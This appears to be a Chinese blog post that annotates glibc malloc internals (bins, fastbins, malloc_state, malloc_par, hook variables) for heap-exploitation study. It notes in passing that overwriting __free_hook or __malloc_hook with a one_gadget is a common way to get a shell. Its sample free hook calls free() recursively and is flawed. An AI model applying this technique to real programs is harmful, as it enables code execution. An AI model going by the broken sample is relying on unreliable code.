<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Binmap</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   为了帮助补偿大量的bins，一个一层索引结构被用来逐个桶(bin by bin)地搜索。</span></span><br><span class="line"><span class="comment">   `binmap` 是一个位向量，用于记录bins是否绝对为空，以便在遍历</span></span><br><span class="line"><span class="comment">   时可以跳过它们。位并不会在桶变空后立即清除，而是仅在</span></span><br><span class="line"><span class="comment">   malloc 遍历过程中注意到它们是空时才会清除。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在映射字中保守地使用32位，即使在64位系统上也是如此 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSHIFT      5  <span class="comment">// 每个映射字的位移量，表示每个字包含 2^5 = 32 位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP       (1U &lt;&lt; BINMAPSHIFT)  <span class="comment">// 每个映射字包含的位数，这里是 32 位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE       (NBINS / BITSPERMAP) <span class="comment">// 桶映射的大小，即总桶数除以每个映射字的位数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将bin索引转换为桶映射字的索引</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i)     ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="comment">// 根据bin的索引计算出对应的位掩码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i)       ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line"><span class="comment">// 标记指定的桶为空，更新映射字</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i)    ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line"><span class="comment">// 清除指定的桶位，标记为非空</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m, i)  ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))</span></span><br><span class="line"><span class="comment">// 获取指定桶的映射状态（是否为空），返回对应的位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m, i)  ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))</span></span><br></pre></td></tr></table></figure>

<h2 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h2><p>单向链表，头插法，即每次插入新的chunk都在头节点和头结点的下一个节点进行插入</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   快速桶（Fastbins）</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   一组链表，保存最近释放的小块内存。fastbin</span></span><br><span class="line"><span class="comment">   不是双向链接的。单向链接更快，并且由于块从未</span></span><br><span class="line"><span class="comment">   从这些链表的中间位置删除，因此不需要双向链接。</span></span><br><span class="line"><span class="comment">   此外，与常规桶不同，它们甚至不是以先进先出</span></span><br><span class="line"><span class="comment">   的顺序处理（使用更快的后进先出），因为在fastbin</span></span><br><span class="line"><span class="comment">   通常使用的瞬态上下文中，顺序并不是非常重要。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   fastbin中的块保持其使用位被设置，因此不能与</span></span><br><span class="line"><span class="comment">   其他释放的块合并。malloc_consolidate 函数会释放</span></span><br><span class="line"><span class="comment">   所有fastbin中的块，并将它们与其他释放的块合并。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span>  <span class="comment">// 定义指向 malloc_chunk 结构的指针类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])  <span class="comment">// 获取指定索引的fastbin中的块</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 偏移量为 2，以使用其他不可索引的前两个桶 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line"><span class="meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)  <span class="comment">// 计算给定大小对应的fastbin索引</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 我们支持的最大fastbin请求大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)  <span class="comment">// 最大fastbin大小，根据系统字长调整</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS  (fastbin_index(request2size(MAX_FAST_SIZE)) + 1)  <span class="comment">// fastbin的数量</span></span></span><br></pre></td></tr></table></figure>

<p>这个fastbin合并操作也可以利用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD 是在 free() 中触发</span></span><br><span class="line"><span class="comment">   自动合并可能周围的fastbin chunk。这个值是一个</span></span><br><span class="line"><span class="comment">   启发式的值，因此具体的数值不应该太过于重要。它</span></span><br><span class="line"><span class="comment">   被定义为默认修剪阈值的一半，作为一种折中启发式，</span></span><br><span class="line"><span class="comment">   仅在可能导致修剪的情况下尝试合并。然而，由于</span></span><br><span class="line"><span class="comment">   合并即使在不使用修剪时也能减少大块周围的碎片，</span></span><br><span class="line"><span class="comment">   所以这个值并不是动态可调的。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   NONCONTIGUOUS_BIT 表示 MORECORE 不返回连续的区域。</span></span><br><span class="line"><span class="comment">   否则，连续性在合并结果时会被利用，尽可能地</span></span><br><span class="line"><span class="comment">   合并连续的 MORECORE 调用结果。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   初始值来自 MORECORE_CONTIGUOUS，但如果使用 mmap</span></span><br><span class="line"><span class="comment">   作为 sbrk 的替代品，则会动态改变。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)  <span class="comment">// 判断内存块是否连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M)       (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)  <span class="comment">// 判断内存块是否非连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M)   ((M)-&gt;flags |= NONCONTIGUOUS_BIT)         <span class="comment">// 设置内存块为非连续</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M)      ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)        <span class="comment">// 设置内存块为连续</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* fastbin中处理的最大内存大小。 */</span></span><br><span class="line"><span class="type">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   设置 max_fast 的值。</span></span><br><span class="line"><span class="comment">   如果为 0，则使用不可能的较小值。</span></span><br><span class="line"><span class="comment">   前提条件：main_arena中没有现有的fastbin chunk。</span></span><br><span class="line"><span class="comment">   由于 do_check_malloc_state() 会检查这一点，</span></span><br><span class="line"><span class="comment">   我们在更改 max_fast 之前调用 malloc_consolidate()。</span></span><br><span class="line"><span class="comment">   请注意，如果 max_fast 被减少，则其他区域将泄露</span></span><br><span class="line"><span class="comment">   它们的fastbin条目。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? MIN_CHUNK_SIZE / 2 : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line"><span class="title function_">get_max_fast</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 告诉 GCC 优化器 global_max_fast 永远不会大于</span></span><br><span class="line"><span class="comment">     MAX_FAST_SIZE。这避免了在 _int_malloc 中</span></span><br><span class="line"><span class="comment">     的越界数组访问（在大小参数的常量传播后）。</span></span><br><span class="line"><span class="comment">     （这段代码不会执行，因为 malloc 保持</span></span><br><span class="line"><span class="comment">     global_max_fast 不变量，但优化器可能不会识别</span></span><br><span class="line"><span class="comment">     这一点。） */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Internal-state-representation-and-initialization"><a href="#Internal-state-representation-and-initialization" class="headerlink" title="Internal state representation and initialization"></a>Internal state representation and initialization</h2><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p><code>malloc_state</code> 结构体是实现内存分配器的核心数据结构之一，它包含了多个用于管理内存分配和释放状态的字段。在多线程环境中，需要通过互斥锁来确保对这些状态的安全访问。</p>
<p><code>have_fastchunks</code> 字段虽然是近似值，但对于优化内存管理的性能十分重要，通过减少不必要的合并调用，可以提高分配效率。整体上，这种设计具有良好的性能和灵活性，适合在动态内存管理中使用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   have_fastchunks 表示可能存在一些fastbin chunks。</span></span><br><span class="line"><span class="comment">   它在将块放入任何fastbin时设置为 true，并在</span></span><br><span class="line"><span class="comment">   malloc_consolidate 中被清除。这个值是近似的，</span></span><br><span class="line"><span class="comment">   因为它可能在没有fastbin chunk时被设置，或者即使</span></span><br><span class="line"><span class="comment">   存在fastbin chunk时也可能被清除。由于它的唯一目的是</span></span><br><span class="line"><span class="comment">   减少对 malloc_consolidate 的冗余调用，因此</span></span><br><span class="line"><span class="comment">   它并不影响正确性。因此我们可以安全地使用</span></span><br><span class="line"><span class="comment">   放松的原子访问。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 序列化访问。 */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* 标志（以前在 max_fast 中）。 */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 如果快速桶块包含最近插入的空闲块，则设置。 */</span></span><br><span class="line">  <span class="comment">/* 注意这是一个布尔值，但并不是所有目标都支持</span></span><br><span class="line"><span class="comment">     布尔类型的原子操作。 */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 快速桶 */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* top chunk的基址--不在其他桶中保存 */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 最近一次拆分小请求的剩余部分 */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 正常的桶，按照上述描述打包 */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 桶的位图 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 空闲区域的链表。该字段的访问由 arena.c 中的 free_list_lock 序列化。 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 附加到该区域的线程数量。 如果区域在空闲列表中，则为 0。</span></span><br><span class="line"><span class="comment">     该字段的访问由 arena.c 中的 free_list_lock 序列化。 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 从系统中在该区域分配的内存。 */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>mutex是互斥锁，前面说到的arena为了解决多线程冲突的问题，所以如果使用了该arena，会进行上锁。<br>后面的flags是标志位标志着一些特征，这里不做深入只需要有个概念。fastbins是一个链表后面再做解释，top指的是top chunk，bins也是一个chunk的链表数组，next指针指向的是下一个malloc_state的位置。而后面那个*next_free指针是指向下一个未使用的malloc_state的位置。</p>
<h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><p><code>malloc_par</code> 结构体用于管理和配置内存分配器的参数。它包含了多个调节和监控内存分配行为的字段，这使得内存管理更加灵活和高效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* 可调参数 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trim_threshold;    <span class="comment">// 修剪阈值</span></span><br><span class="line">  INTERNAL_SIZE_T top_pad;         <span class="comment">// 顶部填充</span></span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;   <span class="comment">// mmap 阈值</span></span><br><span class="line">  INTERNAL_SIZE_T arena_test;       <span class="comment">// arena 测试</span></span><br><span class="line">  INTERNAL_SIZE_T arena_max;        <span class="comment">// arena 最大值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 内存映射支持 */</span></span><br><span class="line">  <span class="type">int</span> n_mmaps;                      <span class="comment">// 当前 mmap 的数量</span></span><br><span class="line">  <span class="type">int</span> n_mmaps_max;                  <span class="comment">// 当前 mmap 的最大数量</span></span><br><span class="line">  <span class="type">int</span> max_n_mmaps;                  <span class="comment">// 最大 mmap 数量</span></span><br><span class="line">  <span class="comment">/* mmap_threshold 是动态的，直到用户手动设置它，</span></span><br><span class="line"><span class="comment">     此时我们需要禁用任何动态行为。 */</span></span><br><span class="line">  <span class="type">int</span> no_dyn_threshold;             <span class="comment">// 禁用动态阈值</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 统计信息 */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;      <span class="comment">// 已映射内存</span></span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  <span class="comment">// 最大映射内存</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 通过 MORECORE/sbrk 分配的第一个地址。 */</span></span><br><span class="line">  <span class="type">char</span> *sbrk_base;                  <span class="comment">// sbrk 基础地址</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* 使用的最大桶数量。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_bins;               <span class="comment">// tcache 桶数量</span></span><br><span class="line">  <span class="type">size_t</span> tcache_max_bytes;          <span class="comment">// tcache 最大字节数</span></span><br><span class="line">  <span class="comment">/* 每个桶中最大块数。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_count;              <span class="comment">// tcache 块数量</span></span><br><span class="line">  <span class="comment">/* 从未排序列表中移除的最大块数，这些块不用于</span></span><br><span class="line"><span class="comment">     填充缓存。 */</span></span><br><span class="line">  <span class="type">size_t</span> tcache_unsorted_limit;     <span class="comment">// tcache 未排序限制</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里需要注意一下<code>mp_</code>结构体后面经常用到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span></span><br><span class="line"><span class="comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span></span><br><span class="line"><span class="comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span></span><br><span class="line"><span class="comment">   before using. This malloc relies on the property that malloc_state</span></span><br><span class="line"><span class="comment">   is initialized to all zeroes (as is true of C statics).  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* These variables are used for undumping support.  Chunked are marked</span></span><br><span class="line"><span class="comment">   as using mmap, but we leave them alone if they fall into this</span></span><br><span class="line"><span class="comment">   range.  NB: The chunk size for these chunks only includes the</span></span><br><span class="line"><span class="comment">   initial size field (of SIZE_SZ bytes), there is no trailing size</span></span><br><span class="line"><span class="comment">   field (unlike with regular mmapped chunks).  */</span></span><br><span class="line"><span class="type">static</span> mchunkptr dumped_main_arena_start; <span class="comment">/* Inclusive.  */</span></span><br><span class="line"><span class="type">static</span> mchunkptr dumped_main_arena_end;   <span class="comment">/* Exclusive.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* True if the pointer falls into the dumped arena.  Use this after</span></span><br><span class="line"><span class="comment">   chunk_is_mmapped indicates a chunk is mmapped.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DUMPED_MAIN_ARENA_CHUNK(p) \</span></span><br><span class="line"><span class="meta">  ((p) &gt;= dumped_main_arena_start &amp;&amp; (p) &lt; dumped_main_arena_end)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is only one instance of the malloc parameters.  */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Initialize a malloc_state struct.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span></span><br><span class="line"><span class="comment">   when creating a new arena.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mbinptr bin;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Establish circular links for normal bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      bin = bin_at (av, i);</span><br><span class="line">      bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  set_noncontiguous (av);</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  av-&gt;top = initial_top (av);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Other internal utilities operating on mstates</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">sysmalloc</span> <span class="params">(INTERNAL_SIZE_T, mstate)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span>      <span class="title function_">systrim</span> <span class="params">(<span class="type">size_t</span>, mstate)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span>     <span class="title function_">malloc_consolidate</span> <span class="params">(mstate)</span>;</span><br></pre></td></tr></table></figure>



<h2 id="hook函数"><a href="#hook函数" class="headerlink" title="hook函数"></a>hook函数</h2><p>在用户没有自定义之前，hook函数默认为空，所以我们常通过改hook函数为one_gadget来getshell</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* -------------- Early definitions for debugging hooks ---------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Define and initialize the hook variables.  These weak definitions must</span></span><br><span class="line"><span class="comment">   appear before any use of the variables in a function (arena.c uses one).  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> weak_variable</span></span><br><span class="line"><span class="comment">/* In GNU libc we want the hook variables to be weak definitions to</span></span><br><span class="line"><span class="comment">   avoid a problem with Emacs.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> weak_variable weak_function</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Forward declarations.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">malloc_hook_ini</span> <span class="params">(<span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                              <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">realloc_hook_ini</span> <span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                               <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">memalign_hook_ini</span> <span class="params">(<span class="type">size_t</span> alignment, <span class="type">size_t</span> sz,</span></span><br><span class="line"><span class="params">                                <span class="type">const</span> <span class="type">void</span> *caller)</span> __THROW;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> HAVE_MALLOC_INIT_HOOK</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__malloc_initialize_hook)</span> <span class="params">(<span class="type">void</span>)</span> = <span class="literal">NULL</span>;</span><br><span class="line">compat_symbol (libc, __malloc_initialize_hook,</span><br><span class="line">	       __malloc_initialize_hook, GLIBC_2_0);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="type">void</span> *__ptr,</span></span><br><span class="line"><span class="params">                                   <span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__malloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span> = malloc_hook_ini;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__realloc_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">void</span> *__ptr, <span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span></span><br><span class="line">  = realloc_hook_ini;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">weak_variable</span> <span class="params">(*__memalign_hook)</span></span><br><span class="line">  <span class="params">(<span class="type">size_t</span> __alignment, <span class="type">size_t</span> __size, <span class="type">const</span> <span class="type">void</span> *)</span></span><br><span class="line">  = memalign_hook_ini;</span><br><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__after_morecore_hook)</span> <span class="params">(<span class="type">void</span>)</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This function is called from the arena shutdown hook, to free the</span></span><br><span class="line"><span class="comment">   thread cache (if it exists).  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span> <span class="params">(<span class="type">void</span> *__ptr, <span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p><strong>语法分析</strong></p>
<ol>
<li><p><strong><code>void</code></strong>：</p>
<ul>
<li>这是返回类型，表示这个函数不返回任何值。</li>
</ul>
</li>
<li><p><strong><code>weak_variable</code></strong>：</p>
<ul>
<li>这是一个类型修饰符，通常用于指示编译器这是一个弱符号（weak symbol）。弱符号允许在链接时可以被同名的强符号（strong symbol）覆盖。这在库中常用，以允许用户自定义特定的行为而不影响库的默认实现。</li>
</ul>
</li>
<li><p><strong><code>(*__free_hook)</code></strong>：</p>
<ul>
<li>这里定义了一个函数指针，<code>__free_hook</code> 是指针的名字。<code>(*__free_hook)</code> 表示 <code>__free_hook</code> 是一个指向函数的指针。函数指针的定义需要括号将指针名称括起来，这是因为在 C 语言中，<code>*</code> 优先级高于函数的参数列表。</li>
</ul>
</li>
<li><p><strong><code>(void *__ptr, const void *)</code></strong>：</p>
<ul>
<li>这是函数指针所指向的函数的参数列表：<ul>
<li><code>void *__ptr</code>：第一个参数是一个指向 <code>void</code> 类型的指针，通常用于指向要释放的内存块。</li>
<li><code>const void *</code>：第二个参数也是一个指向 <code>void</code> 的常量指针，常用于传递上下文信息或其他数据，而不希望在钩子函数中修改它。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong><code>= NULL;</code></strong>：</p>
<ul>
<li>这是对 <code>__free_hook</code> 的初始化，将其初始值设为 <code>NULL</code>，表示目前没有关联的具体实现。当这个钩子被调用时，如果没有用户提供的实现，指针为 <code>NULL</code> 时通常会导致调用默认的 <code>free</code> 函数或产生错误。</li>
</ul>
</li>
</ol>
<p><strong>整体含义</strong></p>
<p>综上所述，这行代码的作用是定义一个名为 <code>__free_hook</code> 的函数指针，这个指针可以指向一个特定的函数，该函数用于替代标准 <code>free</code> 操作。这个替代操作可以在内存管理系统中提供自定义行为，例如在释放内存时进行日志记录、统计等操作。由于它是一个弱符号，用户可以在链接时提供自己的实现来替代这个钩子，从而定制内存释放的行为。</p>
<p><strong>示例用法</strong></p>
<p>假设用户想要定义自己的 <code>free</code> 行为，他们可能会这样做：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">my_free_hook</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">const</span> <span class="type">void</span> *context)</span> &#123;</span><br><span class="line">    <span class="comment">// 自定义释放操作</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing memory at %p\n&quot;</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr); <span class="comment">// 调用标准的 free 函数释放内存</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在某处的代码中</span></span><br><span class="line">__free_hook = my_free_hook; <span class="comment">// 将钩子指向用户自定义的实现</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，用户定义了一个自定义的 <code>my_free_hook</code> 函数，并将 <code>__free_hook</code> 指向它。这样，任何调用 <code>free</code> 的操作，都会通过 <code>my_free_hook</code> 先执行，从而实现用户自定义的内存释放逻辑。</p>
